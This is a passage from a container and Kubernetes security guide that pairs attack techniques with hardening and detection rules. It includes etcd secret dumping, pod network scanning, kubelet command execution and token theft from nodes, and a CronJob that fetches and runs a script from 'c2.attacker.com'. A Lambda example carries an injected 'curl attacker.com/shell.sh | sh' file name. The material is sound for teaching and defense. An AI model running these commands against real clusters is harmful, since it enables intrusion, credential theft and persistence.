**etcd** stores all Kubernetes state (including secrets in plaintext by default). etcd should be encrypted at rest (`EncryptionConfiguration` with `aescbc`, `aesgcm`, or `secretbox` providers), protected by mutual TLS (client certificate authentication), and network-isolated (accessible only from API server nodes).

**etcd direct access — secret extraction:**

```bash
# If an attacker has network access to etcd (default port 2379)
# and the etcd client certificates (often found on control plane nodes)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only

# Dump a specific secret (returns protobuf, decode with auger or strings)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/kube-system/admin-token
```

**etcd encryption configuration:**

```yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
      - secrets
      - configmaps
    providers:
      - aescbc:
          keys:
            - name: key1
              secret: <base64-encoded-32-byte-key>
      - identity: {}  # fallback for reading unencrypted data
```

### 2.7 Secrets management — external integrations

Kubernetes native Secrets are base64-encoded, stored in etcd, and visible to anyone with `get secrets` RBAC. External secret managers provide encryption, rotation, and audit trails.

**external-secrets-operator (ESO):**

```yaml
apiVersion: external-secrets.io/v1beta1
kind: SecretStore
metadata:
  name: vault-store
  namespace: production
spec:
  provider:
    vault:
      server: "https://vault.example.com"
      path: "secret"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "app-role"
---
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
  namespace: production
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-store
    kind: SecretStore
  target:
    name: db-secret
  data:
  - secretKey: password
    remoteRef:
      key: database/creds
      property: password
```

**Vault CSI driver:**

```yaml
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: vault-db-creds
spec:
  provider: vault
  parameters:
    vaultAddress: "https://vault.example.com"
    roleName: "app-role"
    objects: |
      - objectName: "db-password"
        secretPath: "database/creds"
        secretKey: "password"
---
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  containers:
  - name: app
    image: myapp:v1
    volumeMounts:
    - name: secrets
      mountPath: "/mnt/secrets"
      readOnly: true
  volumes:
  - name: secrets
    csi:
      driver: secrets-store.csi.k8s.io
      readOnly: true
      volumeAttributes:
        secretProviderClass: vault-db-creds
```

**Sealed Secrets (Bitnami)** — encrypt secrets client-side; only the in-cluster controller can decrypt:

```bash
# Install kubeseal CLI, then encrypt
kubeseal --format yaml < my-secret.yaml > sealed-secret.yaml
# The SealedSecret controller decrypts in-cluster and creates a regular Secret
kubectl apply -f sealed-secret.yaml
```

### 2.8 Lateral movement in Kubernetes

**DNS-based service discovery:**

```bash
# From inside a compromised pod — enumerate services via DNS
# Default DNS domain: <service>.<namespace>.svc.cluster.local
nslookup kubernetes.default.svc.cluster.local
# SRV records reveal port numbers
nslookup -type=srv _https._tcp.kubernetes.default.svc.cluster.local
# Wildcard enumeration
dig +short srv *.default.svc.cluster.local
dig +short srv *.kube-system.svc.cluster.local
# Enumerate all services in a namespace by iterating known names
for svc in kubernetes dashboard prometheus grafana elasticsearch redis postgres mysql; do
  nslookup $svc.default.svc.cluster.local 2>/dev/null && echo "$svc exists"
done
```

**Pod-to-pod network scanning:**

```bash
# Discover pod CIDR (typically 10.244.0.0/16 for flannel, 10.42.0.0/16 for k3s)
# From inside a pod:
ip route | grep -v default
# Scan local subnet for common service ports
for ip in $(seq 1 254); do
  timeout 0.5 bash -c "echo >/dev/tcp/10.244.0.$ip/8080" 2>/dev/null && \
    echo "10.244.0.$ip:8080 open"
done
# Service CIDR scan with nmap (if available or installed)
nmap -sT -p 80,443,8080,8443,3306,5432,6379,27017,9200 10.96.0.0/16 --open -T4
```

**Detection.** Unexpected DNS queries for `*.svc.cluster.local` from application pods. High volume of TCP SYN packets across pod CIDR from a single pod. Use Cilium Hubble or Calico flow logs for L3/L4 network visibility.

### 2.9 Kubelet API exploitation

The kubelet on each node exposes an API (default port 10250) that allows pod listing, log retrieval, and command execution (`/exec`). Port 10255 is the read-only kubelet API (no auth required by default, deprecated but still enabled on many clusters).

**Exploitation:**

```bash
# Enumerate pods on a node via the read-only API
curl -sk https://<node-ip>:10255/pods

# Execute commands via the kubelet API (if anonymous auth is enabled)
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -X POST -d "cmd=id"

# List running pods
curl -sk https://<node-ip>:10250/runningpods/

# Get container logs
curl -sk https://<node-ip>:10250/containerLogs/<namespace>/<pod>/<container>
```

**Hardening:**

```
# kubelet configuration (/var/lib/kubelet/config.yaml)
authentication:
  anonymous:
    enabled: false
  webhook:
    enabled: true
authorization:
  mode: Webhook
readOnlyPort: 0  # disable read-only API on 10255
```

### 2.10 Kubernetes persistence techniques

**CronJob abuse — persistent execution:**

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-health-check  # innocuous name
  namespace: kube-system
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: default
          containers:
            - name: check
              image: alpine
              command:
                - /bin/sh
                - -c
                - "curl -s https://c2.attacker.com/beacon | sh"
          restartPolicy: Never
```

**DaemonSet persistence — runs on every node:**

```bash
# Attacker creates a DaemonSet for node-level persistence
kubectl apply -f - <<'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-monitor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: node-monitor
  template:
    metadata:
      labels:
        app: node-monitor
    spec:
      hostPID: true
      hostNetwork: true
      containers:
        - name: monitor
          image: alpine
          command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
          securityContext:
            privileged: true
          volumeMounts:
            - name: hostroot
              mountPath: /host
      volumes:
        - name: hostroot
          hostPath:
            path: /
EOF
```

**Detection — Falco rules for persistence:**

```yaml
- rule: Unexpected K8s CronJob Created
  desc: Detect creation of CronJobs in system namespaces
  condition: >
    kevt and kcreate and
    ka.target.resource = "cronjobs" and
    ka.target.namespace in (kube-system, kube-public)
  output: >
    CronJob created in system namespace
    (user=%ka.user.name cronjob=%ka.target.name namespace=%ka.target.namespace)
  priority: WARNING
  tags: [k8s, persistence]
```

### 2.9 Node compromise to cluster compromise chain

When an attacker compromises a Kubernetes node:

```bash
# Step 1: Read kubelet credentials from the node
cat /var/lib/kubelet/kubeconfig
# or
cat /etc/kubernetes/kubelet.conf

# Step 2: Extract bootstrap token or client certificate
# The kubelet's kubeconfig contains the API server address and credentials

# Step 3: List all pods on this node
kubectl --kubeconfig=/var/lib/kubelet/kubeconfig get pods -A

# Step 4: Access pod volumes (secrets, configmaps mounted as files)
find /var/lib/kubelet/pods/ -name "token" -o -name "*.key" -o -name "*.crt"

# Step 5: Read service account tokens from pod volumes
find /var/lib/kubelet/pods/ -path "*/serviceaccount/token" -exec cat {} \;

# Step 6: Pivot using stolen tokens
kubectl --token=<stolen-token> auth can-i --list -A
```

---

## 3. Image security and supply chain

### 3.1 Supply chain attacks

**Base image poisoning.** An attacker publishes a malicious image with a name similar to an official image (typosquatting: `ngxin` instead of `nginx`, `python3.11` instead of `python:3.11`). The malicious image contains a backdoor that runs alongside the legitimate application.

**Layer squashing to hide malware.** An attacker modifies an intermediate layer to inject malware, then squashes the image to a single layer. The malware is not visible in the Dockerfile and is harder to detect in individual layer inspection.

**Detection:**

```bash
# Inspect image layers for unexpected changes
docker history --no-trunc <image>

# Extract and examine each layer
docker save <image> -o image.tar
tar xf image.tar
# Each layer directory contains layer.tar with the filesystem diff

# Scan with Trivy
trivy image <image>
trivy image --severity CRITICAL,HIGH <image>

# Scan with Grype
grype <image>
grype <image> --only-fixed  # show only vulnerabilities with available fixes
```

### 3.2 Dockerfile security

```dockerfile
# SECURE Dockerfile example
# 1. Use specific digest-pinned base image
FROM cgr.dev/chainguard/static@sha256:abc123... AS base

# 2. Multi-stage build: build stage separate from runtime
FROM golang:1.22-alpine AS builder
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /app/server .

# 3. Minimal runtime image
FROM base
# 4. Non-root user
USER nonroot:nonroot
COPY --from=builder --chown=nonroot:nonroot /app/server /server
# 5. No-new-privileges
# (enforced via Kubernetes securityContext, not Dockerfile)
ENTRYPOINT ["/server"]
```

**Distroless images.** Google's distroless images (`gcr.io/distroless/static`, `gcr.io/distroless/base`) contain no shell, no package manager, and no unnecessary userland utilities — reducing attack surface. Chainguard images provide similar minimal images with active CVE patching.

### 3.3 Image scanning

```bash
# Trivy: scan an image
trivy image nginx:1.27
# Output: table of CVEs with severity, package, installed version, fixed version

# Trivy: scan with SARIF output for CI integration
trivy image --format sarif --output results.sarif nginx:1.27

# Trivy: scan a Kubernetes cluster
trivy k8s --report summary cluster

# Trivy: scan a filesystem (IaC + secrets)
trivy fs --scanners vuln,secret,misconfig .

# Grype: scan an image
grype nginx:1.27

# Grype: output in JSON for processing
grype -o json nginx:1.27

# Snyk Container
snyk container test nginx:1.27
snyk container monitor nginx:1.27  # continuous monitoring
```

### 3.4 Image signing and verification

**cosign (Sigstore):**

```bash
# Generate a key pair
cosign generate-key-pair

# Sign an image
cosign sign --key cosign.key myregistry.io/app:v1.0

# Verify an image
cosign verify --key cosign.pub myregistry.io/app:v1.0

# Keyless signing (using OIDC identity from CI/CD)
cosign sign --identity-token=$(gcloud auth print-identity-token) \
  myregistry.io/app:v1.0

# Verify keyless signature
cosign verify \
  --certificate-identity=user@example.com \
  --certificate-oidc-issuer=https://accounts.google.com \
  myregistry.io/app:v1.0
```

**SBOM generation with syft:**

```bash
# Generate SBOM in SPDX format
syft myregistry.io/app:v1.0 -o spdx-json > sbom.spdx.json

# Generate SBOM in CycloneDX format
syft myregistry.io/app:v1.0 -o cyclonedx-json > sbom.cdx.json

# Attach SBOM to image as an attestation
cosign attach sbom --sbom sbom.spdx.json myregistry.io/app:v1.0

# Scan SBOM for vulnerabilities
grype sbom:sbom.spdx.json
```

### 3.5 Admission policies for supply chain

**Kyverno — require image signatures:**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-cosign-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
      verifyImages:
        - imageReferences:
            - "myregistry.io/*"
          attestors:
            - entries:
                - keys:
                    publicKeys: |-
                      -----BEGIN PUBLIC KEY-----
                      MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
                      -----END PUBLIC KEY-----
```

**Kyverno — enforce image digest pinning (block tags):**

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-digest
spec:
  validationFailureAction: Enforce
  rules:
    - name: require-digest
      match:
        any:
          - resources:
              kinds:
                - Pod
      validate:
        message: "Images must use digest pinning (@sha256:...), not tags"
        pattern:
          spec:
            containers:
              - image: "*@sha256:*"
```

**Image pull policy hardening:**

```yaml
# Always pull to prevent using stale cached images
# Combined with digest pinning for supply chain integrity
spec:
  containers:
    - name: app
      image: myregistry.io/app@sha256:abc123...
      imagePullPolicy: Always
```

---

## 4. Runtime security

### 4.1 Falco rules

Falco monitors system calls at the kernel level (via eBPF or kernel module) and matches events against rules.

**Shell spawned inside a container:**

```yaml
- rule: Shell Spawned in Container
  desc: Detect shell execution inside a container
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, dash, ash, ksh, csh, tcsh, fish) and
    not proc.pname in (crond, supervisord, entrypoint.sh)
  output: >
    Shell spawned in container
    (user=%user.name shell=%proc.name parent=%proc.pname
     command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: WARNING
  tags: [container, shell, mitre_execution]
```

**Sensitive file access:**

```yaml
- rule: Read Sensitive File in Container
  desc: Detect reading of sensitive files like /etc/shadow, /etc/passwd
  condition: >
    open_read and
    container and
    fd.name in (/etc/shadow, /etc/sudoers, /etc/pam.conf) and
    not proc.name in (login, su, sudo, sshd, passwd)
  output: >
    Sensitive file read in container
    (user=%user.name command=%proc.cmdline file=%fd.name
     container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [container, filesystem, mitre_credential_access]
```

**Network tool usage in container:**

```yaml
- rule: Network Tool Launched in Container
  desc: Detect network reconnaissance or exfiltration tools
  condition: >
    spawned_process and
    container and
    proc.name in (nc, ncat, nmap, wget, curl, dig, nslookup, tcpdump,
                   socat, netcat, ssh, scp, sftp)
  output: >
    Network tool launched in container
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: NOTICE
  tags: [container, network, mitre_discovery]
```

**Unexpected binary execution (non-package-manager binary):**

```yaml
- rule: Unexpected Binary Executed in Container
  desc: Detect execution of binaries written after container start
  condition: >
    spawned_process and
    container and
    evt.type = execve and
    proc.is_exe_from_memfd = true
  output: >
    Binary executed from memory in container
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository exe=%proc.exe)
  priority: CRITICAL
  tags: [container, execution, mitre_defense_evasion]
```

### 4.2 AppArmor profiles

```
# /etc/apparmor.d/container-default
#include <tunables/global>

profile container-default flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Deny all file writes except /tmp and /var/tmp
  deny /etc/** w,
  deny /usr/** w,
  deny /bin/** w,
  deny /sbin/** w,
  deny /lib/** w,

  # Deny mount operations
  deny mount,
  deny umount,
  deny pivot_root,

  # Deny raw network access
  deny network raw,
  deny network packet,

  # Deny ptrace
  deny ptrace (readby, tracedby),

  # Allow read access to most paths
  / r,
  /** r,

  # Allow tmp writes
  /tmp/** rwl,
  /var/tmp/** rwl,
}
```

**Applying AppArmor in Kubernetes:**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: apparmor-pod
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: localhost/container-default
spec:
  containers:
    - name: app
      image: myapp:latest
```

### 4.3 SELinux for containers

```yaml
# Kubernetes pod with SELinux context
apiVersion: v1
kind: Pod
metadata:
  name: selinux-pod
spec:
  securityContext:
    seLinuxOptions:
      level: "s0:c123,c456"  # MCS label isolation
      type: "container_t"     # confined container type
  containers:
    - name: app
      image: myapp:latest
```

SELinux `container_t` type prevents: writing to host filesystem paths outside designated volumes, accessing other containers' filesystems, loading kernel modules, modifying kernel parameters. The MCS (Multi-Category Security) labels provide inter-container isolation — containers with different MCS labels cannot access each other's files even if they share the same host filesystem.

### 4.4 Read-only root filesystem

```yaml
# Pod spec with read-only root filesystem
spec:
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        readOnlyRootFilesystem: true
      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: run
          mountPath: /var/run
  volumes:
    - name: tmp
      emptyDir:
        medium: Memory
        sizeLimit: 64Mi
    - name: run
      emptyDir:
        medium: Memory
        sizeLimit: 10Mi
```

This prevents: malware writing binaries to the container filesystem, webshell deployment, crontab modification, modification of application binaries. Applications that need to write (logs, caches, temp files) use explicit `emptyDir` or `tmpfs` mounts at specific paths.

---

## 5. Service mesh security

### 5.1 Istio mTLS enforcement

```yaml
# PeerAuthentication: require mTLS for all workloads in the mesh
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system  # mesh-wide when in istio-system
spec:
  mtls:
    mode: STRICT  # reject plaintext connections
```

**Istio AuthorizationPolicy — deny-all baseline with explicit allows:**

```yaml
# Deny all traffic by default
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: deny-all
  namespace: production
spec: {}
---
# Allow frontend to reach API
apiVersion: security.istio.io/v1
kind: AuthorizationPolicy
metadata:
  name: allow-frontend-to-api
  namespace: production
spec:
  selector:
    matchLabels:
      app: api
  action: ALLOW
  rules:
    - from:
        - source:
            principals:
              - "cluster.local/ns/production/sa/frontend-sa"
      to:
        - operation:
            methods: ["GET", "POST"]
            paths: ["/api/v1/*"]
```

### 5.2 SPIFFE/SPIRE identity

SPIFFE (Secure Production Identity Framework For Everyone) provides cryptographic workload identity. Each workload receives a SPIFFE ID (`spiffe://trust-domain/path`) and an X.509 SVID (SPIFFE Verifiable Identity Document). Istio uses SPIFFE IDs internally — the `principals` field in AuthorizationPolicy references SPIFFE IDs.

SPIRE is the reference implementation of SPIFFE. It runs an agent on each node that attests workload identity based on kernel-level selectors (PID, UID, cgroup, Kubernetes pod labels) and issues short-lived X.509 certificates.

### 5.3 Sidecar bypass detection

An attacker inside a pod can bypass the Envoy sidecar proxy by sending traffic directly via the pod's network interface, circumventing mTLS and authorization policies.

```bash
# Inside a pod: bypass sidecar by connecting to pod IP directly
# Envoy intercepts via iptables rules — bypassing requires:
# 1. Running as UID that matches Istio's exclude-outbound-port annotation
# 2. Using a port excluded from Istio interception
# 3. Modifying iptables rules (requires CAP_NET_ADMIN)
```

**Mitigation:** Use Istio CNI plugin (avoids init container needing `NET_ADMIN`), enable ambient mesh mode (ztunnel per-node instead of sidecar per-pod), enforce `CAP_NET_ADMIN` is dropped via PSS.

---

## 6. Serverless security

### 6.1 AWS Lambda

**Event injection.** Lambda functions triggered by event sources process event data without inherent trust. If the event data (e.g., an S3 object key, an SQS message body, a DynamoDB stream record) is used in an unsafe operation (command execution, SQL query, file path construction), the attacker can inject malicious payloads via the event source.

```python
# VULNERABLE Lambda handler — command injection via S3 key
import subprocess
def handler(event, context):
    key = event['Records'][0]['s3']['object']['key']
    # Attacker uploads file named: "; curl attacker.com/shell.sh | sh;.txt"
    subprocess.run(f"process_file {key}", shell=True)  # RCE

# SECURE version
import subprocess
import shlex
def handler(event, context):
    key = event['Records'][0]['s3']['object']['key']
    # Validate the key format
    if not key.replace('/', '').replace('-', '').replace('.', '').isalnum():
        raise ValueError(f"Invalid S3 key format: {key}")
    subprocess.run(["process_file", key])  # No shell=True, no injection
```

**Persistence.** `/tmp` reuse: files in `/tmp` persist across invocations in the same warm container. Lambda layers: the attacker adds a malicious layer (code loaded before the function) to inject persistent code. Dead-letter queues: failed invocations are sent to a DLQ; the attacker can poison the DLQ to re-trigger their payload. Environment variables: `lambda:UpdateFunctionConfiguration` allows modifying environment variables (including adding malicious values that the function code reads).

**Execution role abuse.** The function's IAM execution role is the principal for all AWS API calls the function makes. `lambda:UpdateFunctionCode` allows replacing the function's code with attacker-controlled code that runs with the execution role's permissions. `lambda:UpdateFunctionConfiguration` can change environment variables, add layers, or modify the VPC configuration.

```bash
# Attacker with lambda:UpdateFunctionCode permission
aws lambda update-function-code \
  --function-name target-function \
  --zip-file fileb://malicious.zip

# Attacker with lambda:UpdateFunctionConfiguration permission
aws lambda update-function-configuration \
  --function-name target-function \
  --layers arn:aws:lambda:us-east-1:999999999999:layer:backdoor:1
```

**VPC Lambda.** A Lambda function configured to run inside a VPC uses ENIs (Elastic Network Interfaces) for network connectivity. This places the function on the VPC network, where it can reach internal services (databases, internal APIs) that are not internet-accessible. An attacker who compromises a VPC Lambda has internal network access.

**Hardening — least-privilege Lambda execution role:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::my-bucket/uploads/*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "arn:aws:logs:*:*:*"
    }
  ]
}
```

### 6.2 Azure Functions and Google Cloud Functions

**Azure Functions.** Function keys (`_master` key, function-level keys) provide authentication to HTTP-triggered functions. The `_master` key grants access to all functions in the function app and to management APIs. `WEBSITE_CONTENTAZUREFILECONNECTIONSTRING` and `WEBSITE_CONTENTSHARE` in environment variables point to the Azure Files share containing the function's code — an attacker with these credentials can modify the deployed code.

**Google Cloud Functions.** `cloudfunctions.functions.sourceCodeGet` allows reading the function's deployed source code — useful for reconnaissance. `cloudfunctions.functions.update` allows redeploying with modified code.

### 6.3 Serverless as C2

Lambda functions (or Cloud Functions, Azure Functions) can be used as C2 (command-and-control) infrastructure: the function receives HTTP requests from implants, stores tasking in DynamoDB/Firestore/Table Storage, and returns commands in the HTTP response. API Gateway (AWS) or Cloud Endpoints (GCP) provide a clean HTTPS endpoint. The infrastructure is ephemeral (no persistent servers to find), scales automatically, and the traffic blends with legitimate cloud API traffic.

Step Functions (AWS), Logic Apps (Azure), and Cloud Workflows (GCP) provide orchestration for multi-step attack sequences: the workflow retrieves credentials, exfiltrates data, and cleans up — all as a serverless pipeline.

---

## 7. Serverless container platforms

### 7.1 AWS Fargate security boundaries

Fargate runs each task in a dedicated lightweight VM (Firecracker microVM). The isolation boundary is the VM, not just the container namespace. This prevents: container escape to a shared host (there is no shared host), kernel exploit affecting other tenants, and access to the EC2 metadata service (unless explicitly enabled via `awsvpcConfiguration`).

**Fargate-specific risks:**
- Task role credential theft via the task metadata endpoint (`169.254.170.2/v2/credentials/<guid>`)
- Container image vulnerabilities remain exploitable
- No access to host-level monitoring (no node to SSH into)
- Shared networking within a task (containers in the same task share the network namespace)

### 7.2 Azure Container Instances

ACI provides per-group VM isolation. Each container group runs in a dedicated Hyper-V virtual machine.

**Risks:** Confidential containers in ACI use AMD SEV-SNP but have had attestation bypass issues. The managed identity credential endpoint at `169.254.169.254` is accessible from within the container.

### 7.3 GCP Cloud Run isolation

Cloud Run uses gVisor (`runsc`) as its container runtime, providing a user-space kernel that intercepts syscalls. gVisor reduces the kernel attack surface by reimplementing a subset of Linux syscalls in Go — a kernel vulnerability in a blocked syscall is not exploitable from within a Cloud Run container.

**Limitations:** gVisor does not support all syscalls (approximately 200 of ~300+), which means some workloads are incompatible. gVisor's own implementation may contain vulnerabilities (distinct from Linux kernel vulnerabilities).

---

## 8. Real-world incidents and CVEs

| CVE / Incident | Year | Impact |
|---|---|---|
| CVE-2019-5736 | 2019 | runc host binary overwrite via `/proc/self/exe` — container-to-host escape |
| CVE-2020-15257 | 2020 | containerd-shim — abstract unix socket accessible from container, leading to host access |
| CVE-2022-0492 | 2022 | cgroup v1 `release_agent` escape when `CAP_SYS_ADMIN` is granted |
| CVE-2024-21626 | 2024 | runc Leaky Vessels — file descriptor leak during WORKDIR processing, host filesystem access |
| CVE-2022-0185 | 2022 | Linux kernel heap overflow in legacy_parse_param, exploitable from unprivileged user namespace inside containers |
| Tesla cryptojacking | 2018 | Kubernetes dashboard exposed without authentication; attackers deployed cryptominers across the cluster |
| Capital One | 2019 | SSRF via misconfigured WAF to IMDS, but container/role misconfiguration enabled S3 exfiltration |
| Codecov supply chain | 2021 | CI/CD image tampered via Bash uploader — exfiltrated environment variables (credentials) from customer CI pipelines |

---

## 9. Container and Kubernetes detection engineering

### 9.1 Sigma rules for container escape indicators

Sigma rules provide vendor-neutral detection logic that can be compiled to Splunk SPL, Elastic DSL, or other SIEMs.

**Privileged container creation:**

```yaml
title: Privileged Container Created
id: e8f9a0b1-container-priv-create
status: stable
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    objectRef.resource: pods
  condition_privileged:
    requestObject.spec.containers[*].securityContext.privileged: "true"
  condition: selection and condition_privileged
level: high
tags:
  - attack.privilege_escalation
  - attack.t1611
falsepositives:
  - Legitimate privileged workloads (device plugins, CNI init containers)
```

**Mount namespace manipulation (host PID/IPC/network):**

```yaml
title: Container With Host Namespace Access
id: f2c3d4e5-container-hostns
status: stable
logsource:
  product: kubernetes
  service: audit
detection:
  selection:
    verb: create
    objectRef.resource: pods
  host_pid:
    requestObject.spec.hostPID: "true"
  host_network:
    requestObject.spec.hostNetwork: "true"
  host_ipc:
    requestObject.spec.hostIPC: "true"
  condition: selection and (host_pid or host_network or host_ipc)
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1611
```

**Cgroup escape pattern — `release_agent` write:**

```yaml
title: Cgroup Release Agent Write Attempt
id: a7b8c9d0-cgroup-escape
status: experimental
logsource:
  product: linux
  category: file_event
detection:
  selection:
    TargetFilename|endswith: '/release_agent'
    EventType: 'write'
  filter_host:
    Container.ID: ''
  condition: selection and not filter_host
level: critical
tags:
  - attack.privilege_escalation
  - cve.2022.0492
```

### 9.2 Falco rules for runtime anomaly detection

Falco operates at the kernel level via eBPF or the kernel module, inspecting syscalls in real time.

**Detect container escape via nsenter or chroot:**

```yaml
- rule: Container Escape via nsenter or chroot
  desc: Detect nsenter or chroot execution inside a container (common escape pattern)
  condition: >
    spawned_process and
    container.id != host and
    (proc.name = nsenter or proc.name = chroot) and
    not proc.pname in (docker-init, containerd-shim, runc)
  output: >
    Container escape tool executed
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository pid=%proc.pid parent=%proc.pname)
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation]
```

**Detect sensitive mount inside container:**

```yaml
- rule: Sensitive Host Path Mounted in Container
  desc: Container started with host-sensitive paths mounted
  condition: >
    container.id != host and
    evt.type = open and
    fd.name startswith /hostfs and
    (fd.name contains /etc/shadow or
     fd.name contains /etc/kubernetes or
     fd.name contains /var/run/secrets)
  output: >
    Sensitive host path access from container
    (user=%user.name file=%fd.name container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, filesystem, mitre_credential_access]
```

**Detect crypto miner process signatures:**

```yaml
- rule: Crypto Mining Process in Container
  desc: Detect known crypto mining binaries or arguments in containers
  condition: >
    spawned_process and
    container.id != host and
    (proc.name in (xmrig, minerd, cpuminer, ethminer, ccminer) or
     proc.cmdline contains "stratum+tcp://" or
     proc.cmdline contains "--donate-level" or
     proc.cmdline contains "pool.minergate")
  output: >
    Crypto miner detected in container
    (user=%user.name command=%proc.cmdline container=%container.name
     image=%container.image.repository)
  priority: CRITICAL
  tags: [container, cryptomining, mitre_resource_hijacking]
```

### 9.3 Tetragon TracingPolicy for Kubernetes-native detection

Cilium Tetragon provides eBPF-based observability and enforcement at the kernel level with Kubernetes-aware context.

**Detect `execve` of escape-related binaries:**

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-container-escape-tools
spec:
  tracepoints:
    - subsystem: syscalls
      event: sys_enter_execve
      args:
        - index: 1
          type: string
      selectors:
        - matchArgs:
            - index: 1
              operator: Prefix
              values:
                - /usr/bin/nsenter
                - /usr/sbin/nsenter
                - /usr/bin/chroot
                - /usr/sbin/mount
          matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "host_ns"
```

**Monitor writes to sensitive kernel paths from within containers:**

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-sensitive-writes
spec:
  kprobes:
    - call: vfs_write
      syscall: false
      return: false
      args:
        - index: 0
          type: file
      selectors:
        - matchArgs:
            - index: 0
              operator: Prefix
              values:
                - /proc/sys/kernel/core_pattern
                - /sys/fs/cgroup
                - /proc/sysrq-trigger
          matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values:
                - "host_ns"
```

### 9.4 OPA/Gatekeeper admission control policies

OPA Gatekeeper enforces policies at the admission controller level, blocking non-compliant workloads before they are scheduled.

**Deny privileged containers (Rego):**

```rego
package k8spsprivileged

violation[{"msg": msg}] {
  container := input.review.object.spec.containers[_]
  container.securityContext.privileged == true
  msg := sprintf(
    "Privileged container not allowed: %s in pod %s",
    [container.name, input.review.object.metadata.name]
  )
}

violation[{"msg": msg}] {
  container := input.review.object.spec.initContainers[_]
  container.securityContext.privileged == true
  msg := sprintf(
    "Privileged init container not allowed: %s in pod %s",
    [container.name, input.review.object.metadata.name]
  )
}
```

**Deny containers running as root:**

```rego
package k8spspmustrunasnonroot

violation[{"msg": msg}] {
  container := input.review.object.spec.containers[_]
  not container.securityContext.runAsNonRoot
  not container.securityContext.runAsUser > 0
  msg := sprintf(
    "Container %s must set runAsNonRoot: true or runAsUser > 0",
    [container.name]
  )
}
```

**Enforce read-only root filesystem:**

```rego
package k8spspreadonlyrootfs

violation[{"msg": msg}] {
  container := input.review.object.spec.containers[_]
  not container.securityContext.readOnlyRootFilesystem
  msg := sprintf(
    "Container %s must set readOnlyRootFilesystem: true",
    [container.name]
  )
}
```

### 9.5 Kubernetes audit log analysis patterns

The Kubernetes API server audit log records all API requests. Key fields: `verb`, `user.username`, `objectRef.resource`, `objectRef.namespace`, `responseStatus.code`.

**Suspicious API call patterns to alert on:**

| Pattern | Indicator | Risk |
|---|---|---|
| `verb=create objectRef.resource=pods/exec` | Interactive exec into running pod | Lateral movement, data access |
| `verb=create objectRef.resource=secrets` repeated from non-controller SA | Mass secret creation | Credential staging |
| `verb=get objectRef.resource=secrets` from unexpected SA | Secret enumeration | Credential theft |
| `verb=create objectRef.resource=clusterrolebindings` | RBAC escalation attempt | Privilege escalation |
| `verb=patch objectRef.resource=deployments` with image change | Image replacement | Supply chain attack |
| `user.username=system:anonymous` with non-public verbs | Unauthenticated API access | Cluster compromise |

**jq query to extract exec events from audit log:**

```bash
cat /var/log/kubernetes/audit.log | \
  jq -r 'select(.verb == "create" and .objectRef.subresource == "exec") |
  [.requestReceivedTimestamp, .user.username, .objectRef.namespace,
   .objectRef.name, .responseStatus.code] | @tsv'
```

### 9.6 Container image scanning integration

**Trivy in CI/CD pipeline (GitLab CI example):**

```yaml
container_scan:
  stage: security
  image: aquasec/trivy:latest
  script:
    - trivy image --exit-code 1 --severity CRITICAL,HIGH
        --ignore-unfixed --format json --output trivy-report.json
        ${CI_REGISTRY_IMAGE}:${CI_COMMIT_SHA}
  artifacts:
    reports:
      container_scanning: trivy-report.json
